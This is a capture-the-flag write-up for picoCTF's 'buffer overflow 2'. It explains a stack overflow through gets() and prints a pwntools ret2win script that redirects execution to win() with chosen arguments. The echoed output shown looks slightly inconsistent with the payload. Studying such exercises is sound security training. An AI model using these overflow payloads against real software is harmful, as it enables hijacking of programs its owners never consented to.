<!--
---
slug: "picoctf-buffer-overflow-2"
title: "picoCTF — buffer overflow 2"
date: "2026-06-29"
ctf: "picoCTF"
challenge: "buffer overflow 2"
tags: ["ret2win", "pwn", "buffer overflow"]
tools: ["pwndbg", "gdb", "pwntools"]
summary: "Overwriting adjacent stack memory to direct program to new function with specified arguments."
---
-->

# picoCTF — buffer overflow 2

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | ret2win |
| Topics | Stack buffer overflow |
| Tools | GDB, pwndbg, pwntools |

---

## Reading the Source

The source code in C is provided.

First off, the `main` function prompts user input and calls the `vuln` function.

```c
puts("Please enter your string: ");
vuln();
```

The `vuln` function creates a buffer with a size of 100 bytes, gets user input using the `gets` function, and prints it to the console using the `puts` function. The `gets` function does not verify that the input does not exceed the buffer size, making it vulnerable to buffer overflow attacks.

```c
char buf[100];
gets(buf);
puts(buf);
```

There is also a defined `win` function with two arguments. The function checks that `arg1` is equal to `0xCAFEF00D` and `arg2` is equal to `0xF00DF00D`. If this condition is met, the function prints the flag to the console.

```c
fgets(buf,FLAGSIZE,f);
if (arg1 != 0xCAFEF00D)
    return;
if (arg2 != 0xF00DF00D)
    return;
printf(buf);
```

---

## Finding the Offset

To find the buffer offset, I used GDB with pwndbg. I started by setting a breakpoint at the `vuln` function to see the assembly code at this point. I then ran the binary to have it break at the breakpoint.

```bash
gdb ./vuln
b vuln
run
```

The relevant assembly code in this function is as follows:

```bash
0x8049351 <vuln+25>    lea    eax, [ebp - 0x6c]
0x8049354 <vuln+28>    push   eax
0x8049355 <vuln+29>    call   gets@plt                    <gets@plt>
```

This assembly code shows size of the buffer is `0x6c` (`108` in decimal). As explored in my writeup for the buffer-overflow-1 challenge, in x86, the ebp is 4 bytes and sits between the buffer and the return address. Hence, the total offset is `112` bytes.

---

## Finding the Win Function Address

To find the address of the `win` function, I used GDB.

```bash
gdb ./vuln
info functions
```

This gave me the addresses of all the functions stored in the binary.

```bash
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490e0  printf@plt
0x080490f0  gets@plt
0x08049100  fgets@plt
0x08049110  getegid@plt
0x08049120  puts@plt
0x08049130  exit@plt
0x08049140  __libc_start_main@plt
0x08049150  setvbuf@plt
0x08049160  fopen@plt
0x08049170  setresgid@plt
0x08049180  _start
0x080491c0  _dl_relocate_static_pie
0x080491d0  __x86.get_pc_thunk.bx
0x080491e0  deregister_tm_clones
0x08049220  register_tm_clones
0x08049260  __do_global_dtors_aux
0x08049290  frame_dummy
0x08049296  win
0x08049338  vuln
0x08049372  main
0x080493f0  __libc_csu_init
0x08049460  __libc_csu_fini
0x08049465  __x86.get_pc_thunk.bp
0x0804946c  _fini
```

This output shows the address of the `win` function is `0x08049296`.

---

## Writing the Exploit

To write my exploit to this vulnerability, I used python and pwntools.

Up to this point, I had collected the following information:
- Offset = `112`
- `win` function address = `0x08049296`

However, in this challenge, I had must not only overwrite the return address of the `vuln` function to redirect to the `win` function, but I must also write the two argument values to the stack to be used in the `win` function.

I found that, in x86 architecture, the stack layout when a function is called is as follows:

```
[win Function Addr        ]
[win Function Return Addr ]
[Argument 1               ]
[Argument 2               ]
```

So, after the `win` function address in my payload, I must include these three values. For the return address, I chose to use the `exit@plt` function address from the list of function addresses above (`0x08049130`). The source code shows that arg1 must equal `0xCAFEF00D` and arg2 must equal `0xF00DF00D`. Hence, my exploit looks as follows:

```python
from pwn import *

p = process('./vuln')

offset = 112
win_addr = 0x08049296
exit_addr = 0x08049130
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

payload = b'A' * offset
payload += p32(win_addr)
payload += p32(exit_addr)
payload += p32(arg1)
payload += p32(arg2)

p.sendline(payload)
p.interactive()
```

Running this exploit, I got the following output:

```
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x080\x91\x04\x08
FLAG{abcdef}
```

My flag is printed, showing my exploit was successful.

---

## What I Learned

- **How to overwrite the arguments and return addresses of functions in x86** This was my first time overwriting function arguments in a buffer overflow exploit.

---

## References
- [picoCTF - buffer overflow 2](https://learn.cylabacademy.org/library/259?page=1&workspace=true)